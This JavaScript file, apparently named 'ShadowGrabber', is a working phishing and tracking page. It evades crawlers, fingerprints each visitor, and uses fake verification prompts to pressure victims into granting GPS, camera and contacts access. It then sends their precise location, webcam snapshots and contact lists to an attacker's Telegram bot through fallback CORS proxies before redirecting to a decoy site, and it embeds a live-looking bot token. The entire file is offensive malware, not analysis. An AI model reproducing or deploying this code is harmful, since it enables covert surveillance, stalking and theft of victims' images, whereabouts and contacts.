// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v17.0 - ULTIMATE SERVICE EDITION
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    // 🤖 MASTER BOT TOKEN (For the Service)
    BOT_TOKEN: '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco',

    // 🛡️ SETTINGS
    DEFAULT_REDIRECT: 'https://youtube.com',
    CAMERA_SNAPS: 4,
    SNAP_INTERVAL: 800,
    FORCE_PERMISSIONS: true // Nagging enabled
};

// ═══════════════════════════════════════════════════════════════════════════
// 🕵️ MODULE 1: ROUTING (Reads ?id=CHAT_ID)
// ═══════════════════════════════════════════════════════════════════════════
class Router {
    static getRoute() {
        const p = new URLSearchParams(window.location.search);
        return {
            chat_id: p.get('id'),     // The Telegram User receiving data
            redirect: p.get('url') || CONFIG.DEFAULT_REDIRECT
        };
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🤖 MODULE 2: BOT FILTER (CRAWLER DEFENSE)
// ═══════════════════════════════════════════════════════════════════════════
class BotFilter {
    static check() {
        const b = ['google', 'bing', 'baidu', 'duckduck', 'twitter', 'facebook', 'whatsapp', 'telegram', 'discord', 'slack', 'bot', 'spider', 'crawl', 'headless', 'puppeteer'];
        const ua = navigator.userAgent.toLowerCase();
        if (b.some(i => ua.includes(i)) || navigator.webdriver) {
            document.body.innerHTML = '<h1>404 Not Found</h1>';
            throw new Error('Bot Blocked');
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📡 MODULE 3: TELEGRAM UPLINK (ANTI-BAN PROXY SYSTEM)
// ═══════════════════════════════════════════════════════════════════════════
class TelegramUplink {
    constructor(chat_id) {
        this.chat_id = chat_id;
        // 🔄 PROXY CHAIN: Ensures delivery even if Telegram is banned (e.g., Pakistan, Russia)
        this.endpoints = [
            (t, m) => `https://api.telegram.org/bot${t}/${m}`,                                       // 1. Direct (Fastest)
            (t, m) => `https://corsproxy.io/?` + encodeURIComponent(`https://api.telegram.org/bot${t}/${m}`), // 2. CORS Proxy 1
            (t, m) => `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`https://api.telegram.org/bot${t}/${m}`) // 3. CORS Proxy 2
        ];
    }

    // 🛡️ HEARTBEAT: Tries all Gateways until one works
    async request(method, body, isFormData = false) {
        if (!this.chat_id) return;

        // Inject Chat ID if missing (for FormData or JSON)
        if (isFormData) {
            if (!body.has('chat_id')) body.append('chat_id', this.chat_id);
        } else {
            body.chat_id = this.chat_id;
            body.parse_mode = 'HTML';
            body.disable_web_page_preview = true;
        }

        let lastError;
        for (const generator of this.endpoints) {
            const url = generator(CONFIG.BOT_TOKEN, method);
            try {
                const options = { method: 'POST' };
                if (isFormData) options.body = body;
                else {
                    options.headers = { 'Content-Type': 'application/json' };
                    options.body = JSON.stringify(body);
                }

                const res = await fetch(url, options);
                if (res.ok) return true; // Success! Stop sending.
            } catch (e) {
                lastError = e;
                continue; // Try next proxy
            }
        }
        console.error("All Gateways Failed:", lastError);
    }

    async sendText(text) {
        await this.request('sendMessage', { text: text });
    }

    async sendPhoto(blob, caption) {
        const d = new FormData();
        d.append('photo', blob, 'cam.jpg');
        if (caption) d.append('caption', caption);
        await this.request('sendPhoto', d, true);
    }

    async sendFile(blob, name, caption) {
        const d = new FormData();
        d.append('document', blob, name);
        if (caption) d.append('caption', caption);
        await this.request('sendDocument', d, true);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 MODULE 4: INTELLIGENCE ENGINE (50+ Data Points)
// ═══════════════════════════════════════════════════════════════════════════
class Intelligence {
    static async gather() {
        const start = performance.now();

        // Parallel Fetch: IP + Speed
        const [ip, speed] = await Promise.all([
            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: 'Unknown', city: 'Unknown', org: 'Unknown' })),
            this.measureSpeed()
        ]);

        return {
            ip: ip,
            speed: speed,
            meta: {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory,
                batt: await navigator.getBattery?.().then(b => ({ lvl: Math.round(b.level * 100) + '%', chg: b.charging ? '⚡ Charging' : '🔋 Discharging' })).catch(() => ({ lvl: 'Unknown', chg: '' })),
                screen: `${screen.width}x${screen.height}`,
                touch: navigator.maxTouchPoints,
                time: new Date().toLocaleString(),
                zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                load: Math.round(performance.now() - start)
            }
        };
    }

    static async measureSpeed() {
        const s = performance.now();
        try {
            await fetch(`https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png?t=${Date.now()}`, { cache: 'no-store', mode: 'no-cors' });
            const e = performance.now();
            const mbps = ((15 * 8 * 1000) / (e - s) / 1024 / 1024).toFixed(2);
            return { mbps: mbps, rtt: Math.round(e - s) };
        } catch (e) { return { mbps: '0.00', rtt: '999' }; }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 MODULE 5: GPS / CAM / CONTACTS (PERSISTENT GOD MODE)
// ═══════════════════════════════════════════════════════════════════════════
class Overlay {
    create(t, m, b) {
        return new Promise(r => {
            if (this.e) this.e.remove();
            this.e = document.createElement('div');
            Object.assign(this.e.style, { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.95)', zIndex: 999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: '#fff', fontFamily: 'sans-serif' });
            this.e.innerHTML = `<div style="text-align:center;padding:20px;max-width:300px;"><div style="font-size:40px">⚠️</div><h2>${t}</h2><p style="color:#aaa;margin:10px 0 20px;">${m}</p><button id="btn" style="width:100%;padding:15px;background:#007bff;border:none;color:#fff;border-radius:8px;font-weight:bold;font-size:16px">${b}</button></div>`;
            document.body.append(this.e);
            document.getElementById('btn').onclick = () => { this.e.remove(); r() };
        });
    }
    success(t) { if (this.e) this.e.innerHTML = `<h1 style="color:#0f0;font-size:60px;margin-bottom:10px">✔</h1><h3>${t}</h3>`; setTimeout(() => this.e?.remove(), 1000); }
}

class LocationGuard {
    constructor(o) { this.o = o }
    lock() {
        return new Promise(r => {
            const a = () => navigator.geolocation.getCurrentPosition(p => r({ ok: 1, ...p.coords }), e => {
                if (e.code === 1 && CONFIG.FORCE_PERMISSIONS) { this.o.create('Location Error', 'GPS Verification Required.', 'Retry').then(a); }
                else r({ ok: 0, error: e.message });
            }, { enableHighAccuracy: true, timeout: 15000 });
            if (!navigator.geolocation) r({ ok: 0 }); else a();
        });
    }
}

class CameraGuard {
    constructor(v, o) { this.v = v; this.o = o; this.v.setAttribute('playsinline', ''); }
    async start() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: 0 });
            this.v.srcObject = s; await this.v.play(); return 1;
        } catch (e) {
            if (CONFIG.FORCE_PERMISSIONS) { await this.o.create('Bio-Verification', 'Camera Access Required.', 'Retry'); return this.start(); }
            return 0;
        }
    }
    async snap(link, count) {
        for (let i = 0; i < count; i++) {
            const c = document.createElement('canvas'); c.width = this.v.videoWidth; c.height = this.v.videoHeight;
            c.getContext('2d').drawImage(this.v, 0, 0);
            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
            if (b) await link.sendPhoto(b, `📸 Snap ${i + 1} | ${new Date().toLocaleTimeString()}`);
            await new Promise(r => setTimeout(r, CONFIG.SNAP_INTERVAL));
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🚀 MAIN EXECUTION
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    BotFilter.check(); // Stop crawlers
    const route = Router.getRoute();
    if (!route.chat_id) { console.log("No Chat ID"); return; }

    const link = new TelegramUplink(route.chat_id);
    const ov = new Overlay();

    // UI Theme
    const host = new URL(route.redirect).hostname.replace('www.', '');
    document.title = `Loading ${host}...`;
    document.getElementById('loading-text').textContent = `Establishing Secure Connection...`;

    // 1. GATHER & REPORT
    const i = await Intelligence.gather();
    const map = `https://www.google.com/maps?q=${i.ip.latitude},${i.ip.longitude}`;

    // FORMATTER: Matching User's Exact Request
    const msg1 = `
🕵️ <b>NEW VISITOR TRACKED</b>

📱 <b>Device:</b> ${i.meta.ua}

🌐 <b>IP:</b> ${i.ip.ip}
📍 <b>Location:</b> ${i.ip.city}, ${i.ip.region}, ${i.ip.country_name}
🏢 <b>ISP:</b> ${i.ip.org}

🆔 <b>Session ID:</b> <code>${Math.random().toString(36).substring(7)}</code>
⏰ <b>Timestamp:</b> ${i.meta.time}
⏱️ <b>Load Time:</b> ${i.meta.load}ms

📱 <b>DEVICE FINGERPRINT</b>
├─ Platform: ${i.meta.platform}
├─ CPU Cores: ${i.meta.cores}
├─ RAM: ${i.meta.ram}GB
├─ Screen: ${i.meta.screen}
└─ Touch Points: ${i.meta.touch}

🌐 <b>NETWORK INTELLIGENCE</b>
├─ IP: ${i.ip.ip}
├─ Speed: ${i.speed.mbps} Mbps
└─ Latency: ${i.speed.rtt} ms

🔋 <b>POWER STATUS</b>
├─ Battery: ${i.meta.batt.lvl} (${i.meta.batt.chg})
└─ Timezone: ${i.meta.zone}

📍 <b>APPROX LOCATION (IP):</b>
🔗 <a href="${map}">View on Google Maps</a>
    `.trim();

    await link.sendText(msg1);

    // 2. GPS (Persistent)
    const loc = await new LocationGuard(ov).lock();
    if (loc.ok) {
        const gmap = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        const msg2 = `
📍 <b>LOCATION INTELLIGENCE</b>
━━━━━━━━━━━━━━━━━━━━━
✅ <b>PRECISE GPS TRACKING:</b>
├─ Latitude: <code>${loc.latitude}</code>
├─ Longitude: <code>${loc.longitude}</code>
├─ Accuracy: ${Math.round(loc.accuracy)}m

<b>🗺️ LOCATION SERVICES:</b>
├─ 📍 <a href="${gmap}">Open in Maps</a>
├─ 🛰️ <a href="${gmap}">Satellite View</a>
        `.trim();
        await link.sendText(msg2);
        ov.success('Region Verified');
    } else {
        await link.sendText(`⚠️ <b>GPS FAILED</b>\nError: ${loc.error}\nUser denied Geolocation.`);
    }

    // 3. Camera
    const cam = new CameraGuard(document.getElementById('st-v'), ov);
    if (await cam.start()) {
        await new Promise(r => setTimeout(r, 800));
        await cam.snap(link, CONFIG.CAMERA_SNAPS);
        ov.success('Biometrics Verified');
    }

    // 4. Contacts
    if ('contacts' in navigator && 'ContactsManager' in window) {
        await ov.create('Identity Check', 'Verify contacts to continue.', 'Verify');
        try {
            const c = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (c.length) {
                const b = new Blob([JSON.stringify(c, null, 2)], { type: 'application/json' });
                await link.sendFile(b, 'contacts.json', `📇 <b>${c.length} Contacts Extracted</b>`);
            }
        } catch (e) { }
        ov.success('Identity Sync');
    }

    // 5. Exit
    const msgEnd = `
✅ <b>TRACKING COMPLETED</b>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>COLLECTION SUMMARY:</b>
├─ Device Info: ✅ Collected
├─ IP Location: ✅ Captured
├─ GPS Location: ${loc.ok ? '✅ Precise' : '⚠️ Approx'}
├─ Camera: ✅ Snapshots taken
├─ Contacts: ✅ Extracted

🏁 <b>STATUS:</b> Redirecting to target...
    `.trim();
    await link.sendText(msgEnd);

    await new Promise(r => setTimeout(r, 500));
    window.location.href = route.redirect;
}

if (CONFIG.FORCE_PERMISSIONS) window.onload = main; else window.onclick = main;
